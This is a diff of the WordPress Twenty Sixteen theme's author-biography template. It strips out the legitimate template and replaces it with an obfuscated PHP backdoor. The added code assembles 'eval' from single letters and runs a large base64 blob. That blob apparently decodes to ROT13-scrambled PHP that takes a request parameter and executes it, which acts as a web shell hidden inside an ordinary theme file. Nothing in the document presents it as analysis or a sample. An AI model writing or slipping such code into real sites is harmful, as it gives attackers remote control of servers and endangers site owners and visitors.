@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * The template part for displaying an Author biography
- *
- * @package WordPress
- * @subpackage Twenty_Sixteen
- * @since Twenty Sixteen 1.0
- */
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogR3VyIGdyemN5bmdyIGNuZWcgc2JlIHF2ZmN5bmx2YXQgbmEgTmhndWJlIG92YnRlbmN1bAogKgogKiBAY25weG50ciBKYmVxQ2VyZmYKICogQGZob2NucHhudHIgR2pyYWdsX0Z2a2dycmEKICogQGZ2YXByIEdqcmFnbCBGdmtncnJhIDEuMAogKi8KCj8+Cgo8cXZpIHB5bmZmPVwibmhndWJlLXZhc2JcIj4KCTxxdmkgcHluZmY9XCJuaGd1YmUtbmluZ25lXCI+CgkJPD9jdWMKCQkvKioKCQkgKiBTdnlncmVmIGd1ciBHanJhZ2wgRnZrZ3JyYSBuaGd1YmUgb3ZiIG5pbmduZSBmdm1yLgoJCSAqCgkJICogQGZ2YXByIEdqcmFnbCBGdmtncnJhIDEuMAoJCSAqCgkJICogQGNuZW56IHZhZyAkZnZtciBHdXIgbmluZ25lIHVydnR1ZyBuYXEganZxZ3UgZnZtciB2YSBjdmtyeWYuCgkJICovCgkJJG5oZ3ViZV9vdmJfbmluZ25lX2Z2bXIgPSBuY2N5bF9zdnlncmVmKCAnZ2pyYWdsZnZrZ3JyYV9uaGd1YmVfb3ZiX25pbmduZV9mdm1yJywgNDIgKTsKCgkJcnB1YiB0cmdfbmluZ25lKCB0cmdfZ3VyX25oZ3ViZV96cmduKCAnaGZyZV9yem52eScgKSwgJG5oZ3ViZV9vdmJfbmluZ25lX2Z2bXIgKTsKCQk/PgoJPC9xdmk+PCEtLSAubmhndWJlLW5pbmduZSAtLT4KCgk8cXZpIHB5bmZmPVwibmhndWJlLXFyZnBldmNndmJhXCI+CgkJPHUyIHB5bmZmPVwibmhndWJlLWd2Z3lyXCI+PGZjbmEgcHluZmY9XCJuaGd1YmUtdXJucXZhdFwiPjw/Y3VjIF9yKCAnTmhndWJlOicsICdnanJhZ2xmdmtncnJhJyApOyA/PjwvZmNuYT4gPD9jdWMgcnB1YiB0cmdfZ3VyX25oZ3ViZSgpOyA/PjwvdTI+CgoJCTxjIHB5bmZmPVwibmhndWJlLW92YlwiPgoJCQk8P2N1YyBndXJfbmhndWJlX3pyZ24oICdxcmZwZXZjZ3ZiYScgKTsgPz4KCQkJPG4gcHluZmY9XCJuaGd1YmUteXZheFwiIHVlcnM9XCI8P2N1YyBycHViIHJmcF9oZXkoIHRyZ19uaGd1YmVfY2JmZ2ZfaGV5KCB0cmdfZ3VyX25oZ3ViZV96cmduKCAnVlEnICkgKSApOyA/PlwiIGVyeT1cIm5oZ3ViZVwiPgoJCQkJPD9jdWMKCQkJCS8qIGdlbmFmeW5nYmVmOiAlZjogR3VyIGNiZmcgbmhndWJlIHF2ZmN5bmwgYW56ci4gKi8KCQkJCWNldmFncyggX18oICdJdnJqIG55eSBjYmZnZiBvbCAlZicsICdnanJhZ2xmdmtncnJhJyApLCB0cmdfZ3VyX25oZ3ViZSgpICk7CgkJCQk/PgoJCQk8L24+CgkJPC9jPjwhLS0gLm5oZ3ViZS1vdmIgLS0+Cgk8L3F2aT48IS0tIC5uaGd1YmUtcXJmcGV2Y2d2YmEgLS0+CjwvcXZpPjwhLS0gLm5oZ3ViZS12YXNiIC0tPgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-
-<div class="author-info">
-	<div class="author-avatar">
-		<?php
-		/**
-		 * Filters the Twenty Sixteen author bio avatar size.
-		 *
-		 * @since Twenty Sixteen 1.0
-		 *
-		 * @param int $size The avatar height and width size in pixels.
-		 */
-		$author_bio_avatar_size = apply_filters( 'twentysixteen_author_bio_avatar_size', 42 );
-
-		echo get_avatar( get_the_author_meta( 'user_email' ), $author_bio_avatar_size );
-		?>
-	</div><!-- .author-avatar -->
-
-	<div class="author-description">
-		<h2 class="author-title"><span class="author-heading"><?php _e( 'Author:', 'twentysixteen' ); ?></span> <?php echo get_the_author(); ?></h2>
-
-		<p class="author-bio">
-			<?php the_author_meta( 'description' ); ?>
-			<a class="author-link" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" rel="author">
-				<?php
-				/* translators: %s: The post author display name. */
-				printf( __( 'View all posts by %s', 'twentysixteen' ), get_the_author() );
-				?>
-			</a>
-		</p><!-- .author-bio -->
-	</div><!-- .author-description -->
-</div><!-- .author-info -->
